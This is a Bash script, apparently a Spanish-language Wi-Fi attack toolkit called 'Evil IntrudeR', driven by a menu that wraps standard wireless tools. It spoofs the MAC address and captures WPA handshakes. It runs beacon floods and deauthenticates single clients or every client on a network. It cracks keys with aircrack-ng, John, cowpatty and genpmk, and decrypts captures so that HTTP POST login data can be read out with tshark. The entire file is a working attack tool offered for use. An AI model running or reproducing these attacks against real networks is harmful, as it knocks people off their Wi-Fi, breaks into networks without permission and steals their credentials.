#!/bin/bash
# Definiciones de colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
lightBlueColour="\e[0;94m\033[1m"

# Función para mostrar el menú inicial
root() {
    if [ $EUID -ne 0 ]; then
        whiptail --title "Evil IntrudeR - by 0x832" --msgbox "no tienes permisos de superusuario..." 8 50
        sudo su
    fi
    clear
}

inicio() {

    while [[ ! $opcion_deseada =~ ^[1-9]$ ]]; do
        clear

        echo -e "${greenColour}    ╭━━━╮╱╱╱╭╮╱╭━━╮╱╱╭╮╱╱╱╱╱╱╱╭╮╱╱╭━━━╮          "
        sleep 0.10
        echo -e "${greenColour}    ┃╭━━╯╱╱╱┃┃╱╰┫┣╯╱╭╯╰╮╱╱╱╱╱╱┃┃╱╱┃╭━╮┃          "
        sleep 0.10
        echo -e "${greenColour}    ┃╰━━┳╮╭┳┫┃╱╱┃┃╭━╋╮╭╋━┳╮╭┳━╯┣━━┫╰━╯┃          "
        sleep 0.10
        echo -e "${greenColour}    ┃╭━━┫╰╯┣┫┃╱╱┃┃┃╭╮┫┃┃╭┫┃┃┃╭╮┃┃━┫╭╮╭╯    ${grayColour}Hecho por ${turquoiseColour}(0x832)  "
        sleep 0.10
        echo -e "${greenColour}    ┃╰━━╋╮╭┫┃╰╮╭┫┣┫┃┃┃╰┫┃┃╰╯┃╰╯┃┃━┫┃┃╰╮          "
        sleep 0.10
        echo -e "${greenColour}    ╰━━━╯╰╯╰┻━╯╰━━┻╯╰┻━┻╯╰━━┻━━┻━━┻╯╰━╯${redColour}v1"

        sleep 0.20
        echo -e "${grayColour}  Esta herramienta te ofrece diferentes funciones, como por ejemplo\n""  poder capturar el handshake de una red wifi, entre otras cosas."

        echo -e "\n  ${greenColour}[1]${yellowColour} Poner la tarjeta de red en modo monitor i cambiar la dirección MAC     \n  \n  ${greenColour}[2]${yellowColour} Quitar el modo monitor "
        sleep 0.10
        echo -e " \n  ${greenColour}[3]${yellowColour} Escanear las redes wifi a nuestro alrededor"
        sleep 0.10
        echo -e "\n  ${greenColour}[4]${yellowColour} Escanear una red en concreto     \n  \n  ${greenColour}[5]${yellowColour} Ataque Beacon Flood"
        sleep 0.10
        echo -e "\n  ${greenColour}[6]${yellowColour} Ataque de desautenticación     \n  \n  ${greenColour}[7]${yellowColour} Fuerza bruta "
        sleep 0.10
        echo -e "\n  ${greenColour}[8]${yellowColour} Espionaje en la red \n"

        echo -e -n " ${grayColour}   Elige tu opción deseada: "

        read opcion_deseada
    done
}

nombre_o_mac() {
    echo -e -n "\n ${greenColour}        Introduce el ${redColour}[BSSID] o [ESSID] ${greenColour} de la red wifi: ${grayColour} "
}

activar_modo_monitor() {

    airmon-ng start $nombre_de_la_targeta > /dev/null 2>&1 && echo -e "${lightBlueColour}\nModo monitor ACTIVADO \n ${endColour}"
    iwconfig
    airmon-ng check kill
    exit
}
modo_monitor1() {
    if [[ $opcion_deseada -eq 1 ]]; then

        echo `clear`
        iwconfig

        echo -e -n ${yellowColour}Escribe el nombre de tu tarjeta de red: ${grayColour}
        read nombre_de_la_targeta
        while true; do

            echo -e -n ${yellowColour}Quieres cambiar la MAC S/N?: ${grayColour}
            read sinomac
            case $sinomac in

            [sS])
                ifconfig $nombre_de_la_targeta down >/dev/null 2>&1
                macchanger --mac=00:0c:f1:ad:ba:99 wlan0mon >/dev/null 2>&1
                ifconfig $nombre_de_la_targeta up >/dev/null 2>&1
                echo -e "\n${yellowColour}Como puedes comprobar, la dirección MAC ha sido modificada${endColour}" 2>/dev/null
                macchanger -s $nombre_de_la_targeta 2>/dev/null
                activar_modo_monitor
                ;;
            [Nn])
                activar_modo_monitor
                ;;
            *)
                echo "Opción inválida, por favor ingresa S o N."
                ;;
            esac
        done
    fi
}


quitar_modo_monitor2() {
    if [[ $opcion_deseada -eq 2 ]]; then

        echo `clear`
        iwconfig

        echo -e -n ${yellowColour}Escribe el nombre de tu tarjeta de red: ${grayColour}
        read desactivar_modo_monitor
        airmon-ng stop $desactivar_modo_monitor > /dev/null 2>&1 && echo -e " ${lightBlueColour}DESACTIVAO \n ${endColour}"
        iwconfig
        exit
    fi
}


scan_wifis3() {
    if [[ $opcion_deseada -eq 3 ]]; then
        echo `clear`

        while true; do

            echo -e -n "\n${purpleColour}guardar la información capturada S/N ?: ${grayColour} "
            read guardarinfo
            case $guardarinfo in

            [sS])
                carpeta=Capturas_wifis
                if [ ! -d $carpeta ]; then   #si no exite la carpeta  Capturas_wifis
                    mkdir $carpeta
                    cd $carpeta
                    sleep 2
                    airodump-ng -w Captura wlan0mon
                    exit
                fi
                break
                ;;
            [Nn])
                airodump-ng wlan0mon
                break
                ;;
            *)
                echo "Opción inválida, por favor ingresa S o N."
                ;;
            esac
        done
    fi
}



bssid_essid_ch(){
    nombre_o_mac
    read bssid_o_essid
    carpeta=bssid_o_essid
    echo -e -n "${greenColour}        Introduce el ${redColour}CH (Canal)${greenColour} de la red wifi$: {grayColour} :"
    read ch
    echo `clear`
}
scan_wifi_en_concreto4() {
    if [[ $opcion_deseada -eq 4 ]]; then
        echo `clear`

        while true; do

            echo -e -n "\n${purpleColour}guardar la información capturada S/N ?: ${grayColour} "
            read guardarinfoenconcreto
            case $guardarinfoenconcreto in

            [sS])
                bssid_essid_ch

                if [ ! -d $carpeta ]; then   #si no exite la carpeta  Capturas_wifis
                    mkdir $bssid_o_essid
                    cd $bssid_o_essid
                    airodump-ng -c $ch -w Captura --bssid $bssid_o_essid wlan0mon 2>/dev/null
                    airodump-ng -c $ch -w Captura --essid $bssid_o_essid wlan0mon 2>/dev/null
                    exit
                fi
                break
                ;;
            [Nn])

                bssid_essid_ch
                airodump-ng -c $ch --bssid $bssid_o_essid wlan0mon 2>/dev/null
                airodump-ng -c $ch --essid $bssid_o_essid wlan0mon 2>/dev/null
                exit
                break
                ;;
            *)
                echo "Opción inválida, por favor ingresa S o N."
                ;;
            esac
        done
    fi
}



Beacon() {
    for i in $(seq 1 $aps); do echo $name$i >> $apsfalso; done
    mdk3 wlan0mon b -f $apsfalso -a -s 1000 -c $quecanal
}
Ataque_Beacon_Flood5() {

    if [[ $opcion_deseada -eq 5 ]]; then
        echo `clear`

        echo -e -n "${purpleColour}  Escribe la cantidad de APS que quieres que salgan${grayColour}: "
        read aps
        echo -e -n "${greenColour}  nombre de los aps${grayColour}: "
        read name
        echo -e -n "${purpleColour}  A que canal quieres crear los APS?${grayColour}: "
        read quecanal

        apsfalso=aps.txt
        [ ! -f $apsfalso ] && rm -r $apsfalso 2> /dev/null; Beacon
        exit
    fi
}

expultar_a_la_gente6() {

    if [[ opcion_deseada -eq 6 ]]; then
        unset una_persona_o_todo

        while [[ $una_persona_o_todo != ["1","2"] ]]; do
            echo `clear`
            echo -e -n """\n${greenColour}        Expulsar a una persona ${blueColour}[1]\n
            ${greenColour}Expultar a todos ${blueColour}[2]:${grayColour}
            \n${yellowColour}        Elige la opción que quieras:${grayColour} """
            read una_persona_o_todo
        done

        if [[ una_persona_o_todo -eq 1 ]]; then

            echo `clear`
            echo -e -n "${greenColour}\n    Escrive la cantidad de ataques de desautenticación: ${grayColour}: "
            read ataques
            nombre_o_mac

            read wifi
            echo -e -n "${greenColour}\n    Escrive la mac del dispositivo: ${grayColour}: "
            read macpersona
            echo -e -n "\n"

            aireplay-ng -0 $ataques -e $wifi -c $macpersona wlan0mon 2>/dev/null
            aireplay-ng -0 $ataques -a $wifi -c $macpersona wlan0mon 2>/dev/null


        elif [[ una_persona_o_todo -eq 2 ]]; then

            echo `clear`

            echo -e -n "${redColour}\n    Este ataque desautentica a todos los de la red ${grayColour} "

            echo -e -n "${greenColour}\n    Cantidad de ataques: ${grayColour}: "
            read ataque
            echo -e -n "${greenColour}\n    Escrive la ${redColour}ESSID o BSSID ${grayColour} de la red : "
            read wifi

            aireplay-ng -0 $ataque -e $wifi -c FF:FF:FF:FF:FF:FF wlan0mon 2>/dev/null
            aireplay-ng -0 $ataque -a $wifi -c FF:FF:FF:FF:FF:FF wlan0mon 2>/dev/null
            exit
        fi
    fi
}


brutal_force7() {
    if [[ $opcion_deseada -eq 7 ]]; then

        unset brutal_force

        while [[ $brutal_force != ["1","2","3","4","5"] ]]; do
            echo `clear`
            echo -e "\n${redColour}        Brutal foce${blueColour}"
            echo -e "${blueColour}        [1]${greenColour} Airecrack ${blueColour}"
            echo -e "${blueColour}        [2]${greenColour} John ${blueColour}"
            echo -e "${blueColour}        [3]${greenColour} Cowpatty ${blueColour}"
            echo -e "${blueColour}        [4]${greenColour} Genpmk "

            echo -e -n "${yellowColour}\n        Elige la opción que quieras:${grayColour} "
            read brutal_force
        done

        if [[ brutal_force -eq 1 ]]; then
            echo `clear`
            echo -e "${redColour}    Airecrack"

            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Word list ${grayColour} : "
            read wordlist
            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap ${grayColour} : "
            read cap

            aircrack-ng -w $wordlist $cap
            exit

        elif [[ brutal_force -eq 2 ]]; then

           unset opciones

            while [[ $opciones != ["1","2","3"] ]]; do
                echo `clear`
                echo -e "${blueColour}        [1]${redColour} Brutal force with John ${redColour}( necesitas el  .hccap)"
                echo -e "${blueColour}        [2]${greenColour} Ver contrasenya encriptada ${redColour}( necesitas el  .hccap)${blueColour}"
                echo -e "${blueColour}        [3]${greenColour} Crea el ${redColour}hccap${greenColour} para ver información sobre un el .Cap "

                echo -e -n "${yellowColour}\n        Elige la opción que quieras:${grayColour} "
                read opciones

            done

            if [[ opciones -eq 1 ]]; then

                echo `clear`
                echo -e "${redColour}\n    Tendremos que crear un archivo para poder hacer este ataque con John "

                echo -e -n  "${greenColour}        introduce la ruta absoluta del ${redColour}hccap: ${grayColour} "
                read hccpcapt

                hccap2john $hccpcapt > MIHASH

                echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Word list ${grayColour} : "
                read wordlistjohn

                john --wordlist=$wordlistjohn MIHASH

                echo -e "${greenColour}\n"

                john --show MIHASH

                exit

            elif [[ opciones -eq 2 ]]; then
                echo `clear`

                echo -e -n  "${greenColour}        introduce la ruta absoluta del hccap: ${grayColour} "
                read hccpruta

                hccap2john $hccpruta
                echo -e -n  "${greenColour}\n contrasenya encriptada${grayColour} \n \n"

                exit

            elif [[ opciones -eq 3 ]]; then
                echo `clear`

                echo -e -n "${greenColour}\n    Escrive el nombre que quieres que tenga el ${redColour}hccap ${grayColour} : "
                read capjohn
                echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap ${grayColour} : "

                read rutacap

                aircrack-ng -J $capjohn $rutacap
                echo -e "${greenColour}informacion sobre el hccap${grayColour} \n \n"
                exit
            fi

        elif [[ brutal_force -eq 3 ]]; then
            echo `clear`

            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap ${grayColour} : "
            read capcap
            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Word list ${grayColour} : "
            read wordlistatackcowpatty
            echo -e -n  "${greenColour}\n    introduce el nombre del  ${redColour}AP al que hiciste el ataque${greenColour} : ${grayColour} "
            read apqueires

            cowpatty -r $capcap -f $wordlistatackcowpatty -s $apqueires
            exit

        elif [[ brutal_force -eq 4 ]]; then
            echo `clear`

            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Word list ${grayColour} : "
            read gnpmkwordlist
            echo -e -n  "${greenColour}\n    introduce el nombre del  ${redColour}AP ${greenColour} que quieras: ${grayColour} "
            read nombreapgenpmk

            genpmk -f $gnpmkwordlist -s $nombreapgenpmk -d dic.genpmk

            echo -e -n  "\n${purpleColour}        ahora mismo se te acaba de crear un ${redColour}dic.genpmk${purpleColour} en: ${grayColour} "
            pwd
            ls dic.genpmk

            echo -e -n  "\n${greenColour}        Introduce la ruta absoluta del ${redColour}dic.genpmk${greenColour} que quieras utilizar para este ataque: ${grayColour} "
            read gnpmkadic
            echo -e -n "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap ${grayColour} : "
            read capturagenpmka

            cowpatty -d $gnpmkadic -r $capturagenpmka -s $nombreapgenpmk
            exit
        fi
    fi
}

analisi_De_captura () {
    if [[ $opcion_deseada -eq 8 ]]; then
           echo `clear`
           unset scan

        while [[ $scan != ["1","2"] ]]; do
            echo `clear`
            echo -e "${blueColour}        [1]${greenColour} Escanear por DNS "
            echo -e "${blueColour}        [2]${greenColour} Escanear por HTTP "

            echo -e -n "${yellowColour}\n        Elige la opción que quieras:${grayColour} "
            read scan

        done
        if [[ $scan -eq 1 ]];then

            echo `clear`

            while true; do

                echo -e -n "\n        ${redColour}Tienes la Captura-01-dec.cap S/N ?${endColour} "
                read sino
                case $sino in

                [sS])
                    echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01-dec.cap${greenColour} que quieras: ${grayColour} "
                    read dnsdeccap
                    tshark -r $dnsdeccap -Y "dns" 2>/dev/null

                    exit
                    break
                    ;;
                [Nn])


                    echo -e -n  "${greenColour}\n    introduce el nombre del  ${redColour}AP ${greenColour} de la captura: ${grayColour} "
                    read nombreapairdecap

                    echo -e -n  "${greenColour}\n    introduce la ${redColour}contrasenya ${greenColour} de la red wifi: ${grayColour} "
                    read contraairdecap

                    echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap${greenColour} que quieras: ${grayColour} "
                    read rutacapcap

                    airdecap-ng -e $nombreapairdecap -p $contraairdecap $rutacapcap

                    echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01-dec.cap${greenColour} que quieras: ${grayColour} "
                    read dnsdeccap

                    tshark -r $dnsdeccap -Y "dns" 2>/dev/null

                exit
                    break
                    ;;
                *)
                    echo "Opción inválida, por favor ingresa S o N."
                    ;;
                esac
            done
        fi

        if [[ $scan -eq 2 ]];then

            unset sinohttp            #variable vacia

            while [[ $sinohttp != ["S","s","n","N"] ]]; do
                echo -e -n "\n        ${redColour}Tienes la Captura-01-dec.cap S/N ?${endColour} "
                read sinohttp
            done

            if [[ $sinohttp == [Ss] ]]; then
                echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01-dec.cap${greenColour} que quieras: ${grayColour} "
                read httpdeccap

                echo -e   "${greenColour} TRAFICO HTTP\n${endColour}"
                tshark -r $httpdeccap -Y "http" 2>/dev/null

                echo -e   "${greenColour} DATA QUE VIAJA POR POST =LOGING HTTP\n${endColour}"
                tshark -r $httpdeccap -Y "http.request.method==POST" 2>/dev/null

                echo -e   "${greenColour} INFORMACIÓN MÁS CLARA\n${endColour}"
                tshark -r $httpdeccap -Y "http.request.method==POST" -Tjson 2>/dev/null
                exit

            elif [[ $sinohttp == [Nn] ]]; then

                cd captura_essid 2>/dev/null
                cd captura_bssid 2>/dev/null
                rm Captura-01-dec.cap 2>/dev/null

                echo -e -n  "${greenColour}\n    introduce el nombre del  ${redColour}AP ${greenColour} de la captura: ${grayColour} "
                read nombreapairdecap

                echo -e -n  "${greenColour}\n    introduce la ${redColour}contrasenya ${greenColour} de la red wifi: ${grayColour} "
                read contraairdecap

                echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01.cap${greenColour} que quieras: ${grayColour} "
                read httpdeccapp

                airdecap-ng -e $nombreapairdecap -p $contraairdecap $httpdeccapp


                echo -e -n  "${greenColour}\n    introduce la ruta absoluta de la ${redColour}Captura-01-dec.cap${greenColour} que quieras: ${grayColour} "
                read httpdeccap

                echo -e   "${greenColour} TRAFICO HTTP\n${endColour}"
                tshark -r $httpdeccap -Y "http" 2>/dev/null

                echo -e   "${greenColour} DATA QUE VIAJA POR POST =LOGING HTTP\n${endColour}"
                tshark -r $httpdeccap -Y "http.request.method==POST" 2>/dev/null

                echo -e   "${greenColour} INFORMACIÓN MÁS CLARA\n${endColour}"
                tshark -r $httpdeccap -Y "http.request.method==POST" -Tjson 2>/dev/null
                exit

            fi
        fi

    fi
}

# Función principal
main() {
    root
    inicio
    modo_monitor1
    quitar_modo_monitor2
    scan_wifis3
    scan_wifi_en_concreto4
    Ataque_Beacon_Flood5
    expultar_a_la_gente6
    brutal_force7
    analisi_De_captura
}
# Llama a la función principal
main
